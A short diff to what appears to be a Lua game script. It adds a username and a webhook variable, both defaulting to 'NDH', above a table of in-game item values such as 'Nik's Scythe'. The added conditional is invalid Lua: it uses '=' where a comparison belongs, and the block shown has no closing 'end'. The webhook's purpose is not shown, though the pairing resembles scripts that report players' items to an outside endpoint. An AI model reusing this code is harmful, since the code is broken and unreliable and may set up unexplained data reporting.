@@ -1,3 +1,8 @@
+userName = userName
+webHook = webHook
+if userName = nil then
+userName = "NDH"
+webHook = "NDH"
 local values = {
     ["Nik's Scythe"] = 250000000,
     ["Elderwood Scythe"] = 90,
